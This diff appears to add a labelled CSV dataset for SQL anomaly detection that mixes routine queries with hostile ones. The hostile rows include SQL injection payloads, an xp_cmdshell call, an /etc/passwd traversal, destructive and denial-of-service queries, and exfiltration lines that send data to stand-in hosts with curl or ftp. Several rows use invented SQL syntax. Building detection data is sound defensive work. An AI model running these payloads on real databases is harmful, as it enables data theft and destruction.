@@ -1,0 +1,151 @@
+﻿query log,status,label
+SET GLOBAL max_connections = 1,anormaly,0
+ALTER SYSTEM SET log_level = 'none',anormaly,0
+DROP SCHEMA public CASCADE,anormaly,0
+ALTER TABLE users RENAME TO hidden_users,anormaly,0
+SET SESSION isolation_level = 'none',anormaly,0
+ALTER DATABASE db SET ENCRYPTION OFF,anormaly,0
+DROP INDEX all_indexes ON critical_table,anormaly,0
+SET GLOBAL innodb_buffer_pool_size = 1MB,anormaly,0
+ALTER USER 'admin' WITH PASSWORD '',anormaly,0
+UPDATE accounts SET balance = balance + 1000000 WHERE id = 1,anormaly,0
+"INSERT INTO transfers (from_acct, to_acct, amount) VALUES (999, 999, -5000)",anormaly,0
+DELETE FROM invoices WHERE amount > 0,anormaly,0
+SELECT * FROM ledgers WHERE debit = credit * -1,anormaly,0
+UPDATE expenses SET category = 'fraud' WHERE approval = 'pending',anormaly,0
+"INSERT INTO payments (card, amount) VALUES ('stolen_card', 99999)",anormaly,0
+ALTER TABLE budgets DROP COLUMN limit_check,anormaly,0
+SELECT SUM(profit) FROM sales WHERE date = 'future_date',anormaly,0
+UPDATE refunds SET status = 'approved' FOR ALL,anormaly,0
+"INSERT INTO loans (principal, interest) VALUES (0, 100000)",anormaly,0
+SELECT * FROM cart WHERE user_id = 0 -- guest admin,anormaly,0
+UPDATE orders SET status = 'shipped' WHERE payment_status = 'unpaid',anormaly,0
+"INSERT INTO access_logs (user, action) VALUES ('anonymous', 'delete_all')",anormaly,0
+SELECT * FROM premium_content WHERE subscription = 'none' OR 1=1,anormaly,0
+DELETE FROM rate_limits WHERE ip = 'attacker_ip',anormaly,0
+UPDATE profiles SET verified = TRUE WHERE email = 'fake@domain',anormaly,0
+SELECT * FROM api_endpoints WHERE auth_required = FALSE UNION SELECT * FROM internal,anormaly,0
+INSERT INTO sessions (user_id) VALUES (-1) -- superuser,anormaly,0
+ALTER VIEW public_data AS SELECT * FROM private_data,anormaly,0
+SELECT discount FROM promotions WHERE code = '' OR code = 'invalid',anormaly,0
+SELECT * FROM users WHERE id = 42,normaly,1
+"INSERT INTO products (name, price) VALUES ('Laptop', 999.99)",normaly,1
+UPDATE accounts SET last_login = CURRENT_TIMESTAMP WHERE user_id = 5,normaly,1
+DELETE FROM temp_files WHERE created_at < '2025-01-01',normaly,1
+SELECT COUNT(*) FROM orders WHERE status = 'pending',normaly,1
+"INSERT INTO logs (event, time) VALUES ('login', NOW())",normaly,1
+SELECT name FROM employees WHERE department = 'Sales',normaly,1
+UPDATE inventory SET stock = stock - 1 WHERE product_id = 100,normaly,1
+DELETE FROM expired_sessions WHERE expiry < CURRENT_DATE,normaly,1
+SELECT SUM(amount) FROM transactions WHERE date = '2026-01-05',normaly,1
+"INSERT INTO customers (name, email) VALUES ('John Doe', 'john@example.com')",normaly,1
+SELECT * FROM configs WHERE key = 'app_version',normaly,1
+UPDATE profiles SET bio = 'Updated bio' WHERE user_id = 10,normaly,1
+DELETE FROM old_backups WHERE backup_date < '2024-01-01',normaly,1
+SELECT AVG(rating) FROM reviews GROUP BY product_id,normaly,1
+INSERT INTO categories (name) VALUES ('Electronics'),normaly,1
+SELECT * FROM suppliers JOIN products ON suppliers.id = products.supplier_id,normaly,1
+UPDATE orders SET status = 'shipped' WHERE id = 200,normaly,1
+DELETE FROM cart_items WHERE user_id = 15 AND added < NOW() - INTERVAL '1 DAY',normaly,1
+SELECT MAX(salary) FROM employees,normaly,1
+"INSERT INTO payments (order_id, amount) VALUES (200, 49.99)",normaly,1
+SELECT * FROM logs WHERE time > '2026-01-01' ORDER BY time DESC LIMIT 10,normaly,1
+UPDATE users SET email_verified = TRUE WHERE id = 42,normaly,1
+DELETE FROM notifications WHERE read = TRUE,normaly,1
+SELECT DISTINCT category FROM products,normaly,1
+"INSERT INTO audits (action, user) VALUES ('update', 'admin')",normaly,1
+SELECT * FROM finances WHERE quarter = 4 AND year = 2025,normaly,1
+UPDATE expenses SET approved = TRUE WHERE id = 300,normaly,1
+DELETE FROM archived_emails WHERE sent < '2023-01-01',normaly,1
+SELECT COUNT(DISTINCT user_id) FROM sessions,normaly,1
+"SELECT id, name FROM teams WHERE active = TRUE",normaly,1
+"INSERT INTO events (title, date) VALUES ('Meeting', '2026-02-01')",normaly,1
+UPDATE projects SET status = 'completed' WHERE end_date < CURRENT_DATE,normaly,1
+DELETE FROM tasks WHERE priority = 'low' AND due < NOW(),normaly,1
+SELECT * FROM documents WHERE owner_id = 7 ORDER BY created_at,normaly,1
+"INSERT INTO comments (post_id, text) VALUES (50, 'Great article!')",normaly,1
+SELECT AVG(duration) FROM calls GROUP BY agent_id,normaly,1
+UPDATE contacts SET phone = '123-456-7890' WHERE id = 80,normaly,1
+DELETE FROM subscriptions WHERE expired = TRUE,normaly,1
+SELECT * FROM inventory WHERE stock > 0 LIMIT 20,normaly,1
+"INSERT INTO reports (type, generated) VALUES ('monthly', NOW())",normaly,1
+SELECT SUM(revenue) FROM sales WHERE month = 1,normaly,1
+UPDATE vendors SET rating = 4.5 WHERE id = 90,normaly,1
+DELETE FROM temp_data WHERE processed = TRUE,normaly,1
+SELECT * FROM users JOIN roles ON users.role_id = roles.id,normaly,1
+"INSERT INTO feedback (score, comment) VALUES (5, 'Excellent service')",normaly,1
+SELECT MIN(price) FROM products WHERE category = 'Books',normaly,1
+UPDATE logs SET archived = TRUE WHERE time < '2025-12-01',normaly,1
+DELETE FROM drafts WHERE user_id = 25,normaly,1
+SELECT COUNT(*) FROM visits WHERE date = CURRENT_DATE,normaly,1
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' --,anormaly,0
+SELECT id FROM products WHERE name = '' UNION SELECT password FROM admins --,anormaly,0
+UPDATE accounts SET balance = 1000 WHERE id = 5; DROP TABLE logs; --,anormaly,0
+SELECT * FROM orders WHERE order_id = '1' AND 1=0 UNION ALL SELECT credit_card FROM payments,anormaly,0
+INSERT INTO comments (text) VALUES ('test') OR 1=1; EXEC xp_cmdshell('net user'),anormaly,0
+SELECT name FROM employees WHERE dept = 'HR' AND ''='' UNION SELECT schema_name FROM information_schema.schemata,anormaly,0
+DELETE FROM temp WHERE id = -1 OR 'a'='a',anormaly,0
+SELECT * FROM files WHERE path = '../../etc/passwd' --,anormaly,0
+UPDATE profiles SET email = 'hacked@example.com' WHERE user_id = 42 AND 1=2 UNION SELECT * FROM sys.tables,anormaly,0
+SELECT COUNT(*) FROM inventory WHERE stock > 0 OR SLEEP(5)=0,anormaly,0
+SELECT * FROM users WHERE username = 'admin' AND password = 'password123',anormaly,0
+SELECT id FROM auth WHERE email = 'user@domain.com' AND pass = MD5('qwerty'),anormaly,0
+"INSERT INTO login_attempts (user, pass) VALUES ('root', 'admin')",anormaly,0
+SELECT * FROM credentials WHERE login = 'guest' AND hash = SHA1('letmein'),anormaly,0
+UPDATE sessions SET token = 'invalid' WHERE user = 'sysadmin' AND pw = '123456',anormaly,0
+SELECT COUNT(*) FROM accounts WHERE uname = 'manager' AND pwd = 'manager' OR 'x'='x',anormaly,0
+DELETE FROM failed_logins WHERE ip = '192.168.1.1' AND attempt = 'passw0rd',anormaly,0
+SELECT * FROM api_keys WHERE key = 'APIKEY' AND secret = 'secretkey' UNION SELECT * FROM secrets,anormaly,0
+"INSERT INTO users (name, pass) VALUES ('test', 'test123') -- brute force simulation",anormaly,0
+SELECT role FROM roles WHERE user_id = 1 AND password = 'adminadmin',anormaly,0
+GRANT ALL PRIVILEGES ON . TO 'hacker'@'%' IDENTIFIED BY 'pass',anormaly,0
+SELECT credit_card_number FROM transactions ORDER BY date DESC LIMIT 1000,anormaly,0
+SELECT * FROM medical_records WHERE patient_id = ANY (SELECT id FROM patients),anormaly,0
+SELECT password_hash FROM users UNION SELECT api_key FROM configs,anormaly,0
+DUMP TABLE personal_info TO '/var/www/dump.txt',anormaly,0
+"SELECT email, phone FROM customer_data WHERE last_login < '2025-01-01'",anormaly,0
+SELECT * FROM confidential_docs WHERE access_level = 'restricted',anormaly,0
+SELECT encryption_key FROM security_vault,anormaly,0
+"SELECT address, dob FROM profiles EXPORT TO CSV",anormaly,0
+SELECT * FROM audit_logs WHERE event = 'login' AND user = 'vip',anormaly,0
+SELECT * FROM database INTO OUTFILE '/tmp/all_data.csv',anormaly,0
+DECLARE @data XML; SET @data = (SELECT * FROM secrets FOR XML AUTO); SELECT @data,anormaly,0
+COPY (SELECT * FROM finances) TO '/export/finances.dump',anormaly,0
+SELECT * FROM logs BULK INSERT INTO external_server,anormaly,0
+EXPORT TABLE users TO 's3://bucket/leaked_users.json',anormaly,0
+"SELECT CONCAT_WS(',', * ) FROM customer_info INTO OUTFILE '/var/export.csv'",anormaly,0
+DUMP SCHEMA public TO 'ftp://attacker.com/schema.sql',anormaly,0
+SELECT * FROM orders FOR JSON PATH INTO '/json/export.json',anormaly,0
+COPY products TO PROGRAM 'curl -F file=@- http://evil.site/upload',anormaly,0
+SELECT * FROM backups EXPORT SET TO 'http://exfil.domain/data',anormaly,0
+UPDATE balances SET amount = 0 WHERE account_type = 'savings',anormaly,0
+DELETE FROM transactions WHERE date > '2024-01-01',anormaly,0
+ALTER TABLE logs DROP COLUMN evidence,anormaly,0
+INSERT INTO votes (candidate) VALUES ('fraud') REPEAT 1000,anormaly,0
+UPDATE inventory SET quantity = -999 WHERE product_id > 0,anormaly,0
+TRUNCATE TABLE audit_trail,anormaly,0
+UPDATE user_roles SET role = 'admin' WHERE role = 'user',anormaly,0
+DELETE FROM backups WHERE backup_date < CURRENT_DATE,anormaly,0
+ALTER COLUMN passwords TYPE TEXT USING 'corrupted',anormaly,0
+INSERT INTO financials (amount) VALUES (999999999) -- overflow,anormaly,0
+SELECT * FROM large_table CROSS JOIN large_table,anormaly,0
+WHILE 1=1 SELECT SLEEP(10),anormaly,0
+DECLARE @i INT = 1; WHILE @i < 1000000 SET @i = @i + 1; SELECT @i,anormaly,0
+SELECT * FROM users WHERE id IN (SELECT id FROM users) RECURSIVE,anormaly,0
+INSERT INTO temp_table SELECT * FROM huge_log REPEAT 100,anormaly,0
+SELECT COUNT(*) FROM cartesian_product_view,anormaly,0
+UPDATE stats SET value = value + 1 FOR ALL ROWS,anormaly,0
+SELECT * FROM files WHERE content LIKE '%a%' OR CONTENT LIKE '%b%' ... (repeated patterns),anormaly,0
+DECLARE CURSOR c FOR SELECT * FROM infinite_loop_view; FETCH ALL FROM c,anormaly,0
+"SELECT BENCHMARK(100000000, MD5('test'))",anormaly,0
+SELECT * FROM orders WHERE date BETWEEN '1900-01-01' AND '2100-12-31' WITHOUT INDEX,anormaly,0
+SELECT DISTINCT * FROM logs ORDER BY timestamp DESC LIMIT 1 OFFSET 999999,anormaly,0
+SELECT * FROM products JOIN suppliers ON 1=1,anormaly,0
+SELECT SUM(amount) FROM transactions GROUP BY millisecond(timestamp),anormaly,0
+SELECT * FROM users WHERE username REGEXP '.*',anormaly,0
+"SELECT * FROM data WHERE JSON_EXTRACT(details, '$.*') IS NOT NULL",anormaly,0
+SELECT * FROM archive WHERE year = 2025 OR year = 2024 OR ... (long OR chain),anormaly,0
+SELECT COUNT(DISTINCT id) FROM massive_dataset WITHOUT PARTITION,anormaly,0
+SELECT * FROM views WHERE complex_calc > 0 AND complex_calc < 1,anormaly,0
+SELECT * FROM table1 UNION SELECT * FROM table2 UNION ... (many unions),anormaly,0
+ALTER TABLE configs DROP CONSTRAINT primary_key,anormaly,0
